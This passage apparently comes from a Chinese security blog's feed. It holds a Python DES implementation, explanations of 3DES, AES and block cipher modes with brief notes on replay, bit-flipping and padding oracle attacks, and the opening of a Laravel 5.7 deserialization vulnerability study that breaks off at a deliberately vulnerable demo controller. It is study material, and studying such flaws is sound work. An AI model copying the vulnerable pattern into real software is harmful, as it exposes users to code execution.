class="line">S5=[<span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">    <span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">    <span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>]</span><br><span class="line"><span class="comment">#S盒中的S6盒</span></span><br><span class="line">S6=[<span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line"><span class="comment">#S盒中的S7盒</span></span><br><span class="line">S7=[<span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">    <span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line"><span class="comment">#S盒中的S8盒</span></span><br><span class="line">S8=[<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>,</span><br><span class="line">    <span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line"><span class="comment"># S盒</span></span><br><span class="line">S=[S1,S2,S3,S4,S5,S6,S7,S8]</span><br><span class="line"><span class="comment">#P盒</span></span><br><span class="line">P_table=[<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">         <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">         <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">         <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>,</span><br><span class="line">         <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line"><span class="comment">#用于对数据进行扩展置换 32bit-&gt;48bit</span></span><br><span class="line">E_table=[<span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">         <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">         <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">         <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">         <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">         <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#按位异或函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    temp=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        temp+=chr((ord(a[i])<span class="number">-48</span>)^(ord(b[i])<span class="number">-48</span>)+<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="comment">#置换表函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span><span class="params">(a,table)</span>:</span></span><br><span class="line">    temp_R = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        temp_R += a[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> temp_R</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">S_Change</span><span class="params">(m)</span>:</span></span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    <span class="comment">#print len(m)    #48位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)/<span class="number">6</span>):</span><br><span class="line">        temp_m=m[<span class="number">6</span>*i:<span class="number">6</span>*(i+<span class="number">1</span>)]</span><br><span class="line">        line=(ord(temp_m[<span class="number">0</span>])<span class="number">-48</span>)*<span class="number">2</span>+(ord(temp_m[<span class="number">5</span>])<span class="number">-48</span>)</span><br><span class="line">        ranks=(ord(temp_m[<span class="number">1</span>])<span class="number">-48</span>)*<span class="number">8</span>+(ord(temp_m[<span class="number">2</span>])<span class="number">-48</span>)*<span class="number">4</span>+(ord(temp_m[<span class="number">3</span>])<span class="number">-48</span>)*<span class="number">2</span>+(ord(temp_m[<span class="number">4</span>])<span class="number">-48</span>)</span><br><span class="line">        result+=(<span class="string">'&#123;:04b&#125;'</span>.format(S[i][line*<span class="number">16</span>+ranks]))  <span class="comment">#十进制转换为4位二进制 高位补零</span></span><br><span class="line">        <span class="comment">#print result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成16组密钥的F函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span><span class="params">(R,key)</span>:</span></span><br><span class="line">    <span class="comment">#扩展置换E</span></span><br><span class="line">    <span class="comment">#print R</span></span><br><span class="line">    R = Change(R,E_table)</span><br><span class="line">    <span class="comment">#print 'R:'+R</span></span><br><span class="line">    <span class="comment">#print 'key:'+key</span></span><br><span class="line">    temp_R=Xor(R,key)   <span class="comment">#和变换后的48bit key异或</span></span><br><span class="line">    <span class="comment">#print temp_R</span></span><br><span class="line">    temp_R=S_Change(temp_R) <span class="comment"># 八个置换盒 48bit-&gt;32bit</span></span><br><span class="line">    <span class="comment">#print len(temp_R) #32bit</span></span><br><span class="line">    temp_R=Change(temp_R,P_table)</span><br><span class="line">    <span class="keyword">return</span> temp_R</span><br><span class="line"></span><br><span class="line"><span class="comment">#PKCS7Padding:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Padding</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="comment"># m+='\x08'*8 #根据填充方式不同而选择</span></span><br><span class="line">        m=m</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#m+=unichr(8-(len(m)%8))*(8-(len(m)%8)) #填充Unicode编码数据</span></span><br><span class="line">        m+=<span class="string">'\00'</span>*(<span class="number">8</span>-(len(m)%<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="comment">#16轮加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Des_decode</span><span class="params">(m,k)</span>:</span></span><br><span class="line">    <span class="comment">#print m</span></span><br><span class="line">    m=Change(m,IP_table)    <span class="comment">#IP置换</span></span><br><span class="line">    L=m[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    R=m[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    print 'L:' + L, len(L)</span></span><br><span class="line"><span class="string">    print 'R:' + R, len(R)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">        Temp=R</span><br><span class="line">        R=Xor(L,F(R,k[i]))</span><br><span class="line">        L=Temp</span><br><span class="line">    temp_m=Xor(L,F(R,k[<span class="number">15</span>]))+R</span><br><span class="line">    <span class="keyword">return</span> Change(temp_m,IP_table_)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成16轮密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create_key</span><span class="params">(k)</span>:</span></span><br><span class="line">    key = [<span class="string">''</span>] * <span class="number">16</span></span><br><span class="line">    <span class="comment"># 去校验码置换1</span></span><br><span class="line">    k=Change(k,PC_1)</span><br><span class="line">    <span class="comment">#print 'temp_k1:' + temp_k1, len(temp_k1)</span></span><br><span class="line">    <span class="comment"># 16轮密钥生成</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        C=k[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">        D=k[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        print 'C:'+C,len(C)</span></span><br><span class="line"><span class="string">        print 'D:'+D,len(D)</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="comment"># 循环左移</span></span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">1</span> <span class="keyword">or</span> i==<span class="number">2</span> <span class="keyword">or</span> i==<span class="number">9</span> <span class="keyword">or</span> i==<span class="number">16</span> :  <span class="comment"># 1,2,9,16轮循环左移1位</span></span><br><span class="line">            C = C[<span class="number">1</span>:] + C[:<span class="number">1</span>]</span><br><span class="line">            D = D[<span class="number">1</span>:] + D[:<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:   <span class="comment"># 其余轮数循环左移2位</span></span><br><span class="line">            C = C[<span class="number">2</span>:] + C[:<span class="number">2</span>]</span><br><span class="line">            D = D[<span class="number">2</span>:] + D[:<span class="number">2</span>]</span><br><span class="line">        k=C+D   <span class="comment"># 更新k</span></span><br><span class="line">        <span class="comment">#print len(k) #56位</span></span><br><span class="line">        <span class="comment"># 压缩置换2 生成密钥 56-&gt;48</span></span><br><span class="line">        new_k = Change(k, PC_2)</span><br><span class="line">        key[i<span class="number">-1</span>]=new_k</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    print key</span></span><br><span class="line"><span class="string">    for i in key:</span></span><br><span class="line"><span class="string">        print i</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment">#分组/padding/生成16组密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Des</span><span class="params">(m,k)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    print "after padding:",</span></span><br><span class="line"><span class="string">    print hex(libnum.s2n(m)),len(m)</span></span><br><span class="line"><span class="string">    print "k:"+k</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment">#key=Create_key(k)</span></span><br><span class="line">    <span class="comment">#print key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)/<span class="number">8</span>):</span><br><span class="line">        <span class="comment">#print m[8*i:8*(i+1)],libnum.s2b(m[8*i:8*(i+1)]),len(libnum.s2b(m[8*i:8*(i+1)]))</span></span><br><span class="line">        cipher+=Des_decode(libnum.s2b(m[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)]),k)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    while(1):</span></span><br><span class="line"><span class="string">        key = raw_input("Enter key of 8bytes:") #8位key</span></span><br><span class="line"><span class="string">        if len(key)==8:</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        print "error length"</span></span><br><span class="line"><span class="string">    message =raw_input("Enter message of any length:")</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    key=<span class="string">'abcdefgh'</span></span><br><span class="line">    message=<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">    message = Padding(message) <span class="comment">#padding</span></span><br><span class="line">    key = Create_key(libnum.s2b(key)) <span class="comment">#create key 字符串转二进制</span></span><br><span class="line">    <span class="keyword">print</span> binascii.b2a_hex(message)  <span class="comment"># 字符串转对应16进制ASCII码</span></span><br><span class="line"></span><br><span class="line">    cipher=Des(message,key)     <span class="comment">#加密</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"cipher二进制:"</span> + cipher</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"cipher十六进制:"</span>+hex(int(cipher, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    key=key[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> hex(int(cipher, <span class="number">2</span>))[<span class="number">-1</span>]==<span class="string">'L'</span>:</span><br><span class="line">        cipher = Des(hex(int(cipher, <span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>), key)    <span class="comment">#解密 要去掉末尾的'L'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cipher = Des(hex(int(cipher, <span class="number">2</span>))[<span class="number">2</span>:].decode(<span class="string">'hex'</span>), key)  <span class="comment"># 解密</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"message二进制:"</span> + cipher</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"message十六进制:"</span> + hex(int(cipher, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print base64.b64encode(hex(int(cipher, 2))[2:].decode('hex') ) #二进制字符串识别成十进制</span></span><br><span class="line">    <span class="comment">#print len(cipher)</span></span><br></pre></td></tr></table></figure><h1 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h1><p>由于DES密码长度容易被暴力破解，所以3DES算法通过对DES算法进行改进，增加DES的密钥长度来避免类似的攻击，针对每个数据块进行三次DES加密；因此，3DES加密算法并非什么新的加密算法，是DES的一个更安全的变形，它以DES为基本模块，通过组合分组方法设计出分组加密算法。。 </p><p><strong>加/解密过程</strong><br>该算法的加解密过程分别是对明文/密文数据进行三次DES加密或解密，得到相应的密文或明文。</p><p>假设EK（）和DK（）分别表示DES的加密和解密函数，P表示明文，C表示密文，那么加解密的公式如下：<br>加密：C = EK3（ DK2（ EK1（P）） ），即对明文数据进行，加密 –&gt; 解密 –&gt; 加密的过程，最后得到密文数据；<br>解密：P = DK1（ EK2（ DK3（C）） ），即对密文数据进行，解密 –&gt; 加密 –&gt; 解密的过程，最后得到明文数据；  </p><p>其中：K1表示3DES中第一个8字节密钥，K2表示第二个8字节密钥，K3表示第三个8字节密钥，K1、K2、K3决定了算法的安全性，若三个密钥互不相同，本质上就相当于用一个长为168位的密钥进行加密。多年来，它在对付强力攻击时是比较安全的。若数据对安全性要求不那么高，K1可以等于K3。在这种情况下，密钥的有效长度为112位，即K1对应KL（左8字节），K2对应KR（右8字节），K3对应KL（左8字节）。</p><p><img src="../../images/cipher/DES/2.jpg" alt=""><br>当三重密钥均相同时，前两步相互抵消，相当于仅实现了一次加密，因此可实现对普通DES加密算法的兼容。<br><img src="../../images/cipher/DES/3.jpg" alt="">  </p><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示： </p><table><thead><tr><th>AES</th><th>密钥长度（32位比特字)</th><th>分组长度(32位比特字)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>4</td><td>4</td><td>10</td></tr><tr><td>AES-192</td><td>6</td><td>4</td><td>12</td></tr><tr><td>AES-256</td><td>8</td><td>4</td><td>14</td></tr></tbody></table><p>轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。<br>上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。</p><p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：<br><img src="../../images/cipher/DES/4.jpg" alt=""><br>现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下：<br><img src="../../images/cipher/DES/5.png" alt=""><br>上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。</p><p>类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：<br><img src="../../images/cipher/DES/5.jpg" alt=""><br>上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。</p><p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。<br><img src="../../images/cipher/DES/6.png" alt=""><br>上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作  </p><h1 id="分组密码模式"><a href="#分组密码模式" class="headerlink" title="分组密码模式"></a>分组密码模式</h1><p>DES 和 AES 都属于分组密码，他们只能加密固定长度的明文。<br>分组加密会将明文消息划分为固定大小的块，每块明文分别在密钥控制下加密为密文。当然并不是每个消息都是相应块大小的整数倍，所以我们可能需要进行填充。   </p><h2 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h2><p>ECB 模式全称为电子密码本模式（Electronic codebook），在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。<br>加密：<br><img src="../../images/cipher/DES/7.png" alt=""><br>解密：<br><img src="../../images/cipher/DES/8.png" alt=""><br><strong>攻击方式</strong><br>直接找几组不同的密文，然后截取再拼接进行重放攻击 </p><h2 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h2><p>CBC 全称为密码分组链接（Cipher-block chaining） 模式。在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密。<br>加密：<br><img src="../../images/cipher/DES/9.png" alt=""><br>解密：<br><img src="../../images/cipher/DES/10.png" alt=""><br><strong>CBC字节翻转攻击</strong><br><img src="../../images/cipher/DES/11.png" alt=""><br><strong>Padding oracle attack</strong><br>填充提示攻击是一种利用分组密码中的填充部分来进行攻击的方法，在分组密码中，当明文长度不为分组长度的整数倍时，需要在最后一个分组中填充一些数据使其凑满一个分组长度。      </p><p><a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a> </p><h2 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h2><p>CFB 全称为密文反馈模式（Cipher feedback）。明文分组和密文分组之间并没有经过加密这一步骤，只有一个XOR。<br><img src="../../images/cipher/DES/7.jpg" alt=""> </p><p><strong>重放攻击</strong><br><img src="../../images/cipher/DES/8.jpg" alt=""> </p><h2 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h2><p>FB 全称为输出反馈模式（Output feedback），其反馈内容是分组加密后的内容而不是密文<br>加密<br><img src="../../images/cipher/DES/12.jpg" alt=""><br>解密<br><img src="../../images/cipher/DES/13.jpg" alt=""> </p><h2 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h2><p> CTR 模式全称是CounTeR模式(计数器模式)，CTR模式是一种通过将逐次累积的计数器进行加密来生成密钥流的流密码。<br> 加密<br><img src="../../images/cipher/DES/14.jpg" alt=""><br>解密<br><img src="../../images/cipher/DES/15.jpg" alt=""> </p><p>参考文章<br>DES加密算法原理:w<a href="https://www.jianshu.com/p/c44a8a1b7c38" target="_blank" rel="noopener">https://www.jianshu.com/p/c44a8a1b7c38</a><br>DES加密算法分析:<a href="http://ronpa.top/2018/08/20/DES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://ronpa.top/2018/08/20/DES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</a><br>AES 加密算法的原理详解：<a href="https://blog.csdn.net/gulang03/article/details/81175854" target="_blank" rel="noopener">https://blog.csdn.net/gulang03/article/details/81175854</a><br>ctfwiki:<a href="https://ctf-wiki.org/crypto/blockcipher/mode/introduction/" target="_blank" rel="noopener">https://ctf-wiki.org/crypto/blockcipher/mode/introduction/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对称密码算法有时又叫传统密码算法、秘密密钥算法或单密钥算法。对称密码算法的加密密钥能够从解密密钥中推算出来，反过来也成立。在大多数对称算法中，加密解密密钥是相同的。它要求发送者和接收者在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都能对消息进行加密解密。只要通信需要保密，密钥就必须保密。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Laravel漏洞学习</title>
    <link href="https://blog.cfyqy.com/article/d1159936.html"/>
    <id>https://blog.cfyqy.com/article/d1159936.html</id>
    <published>2021-01-14T01:13:56.000Z</published>
    <updated>2021-01-24T09:34:23.467Z</updated>
    
    <content type="html"><![CDATA[<p>laravel漏洞学习</p><a id="more"></a><p>安装 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project laravel/laravel laravel57 <span class="string">"5.7.*"</span></span><br></pre></td></tr></table></figure><h1 id="Laravel5-7反序列化漏洞"><a href="#Laravel5-7反序列化漏洞" class="headerlink" title="Laravel5.7反序列化漏洞"></a>Laravel5.7反序列化漏洞</h1><p>详情可看此文章：<br><a href="https://xz.aliyun.com/t/5911" target="_blank" rel="noopener">https://xz.aliyun.com/t/5911</a><br><a href="https://www.cnblogs.com/tr1ple/p/11079354.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11079354.html</a>   </p><p>漏洞描述：</p><p>Laravel Framework是Taylor Otwell软件开发者开发的一款基于PHP的Web应用程序开发框架。Illuminate是其中的一个组件。Laravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码。</p><p>假设存在以下二次开发漏洞点：<br>在 laravel57/app/Http/Controllers/ 下添加 DemoController 控制器，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span 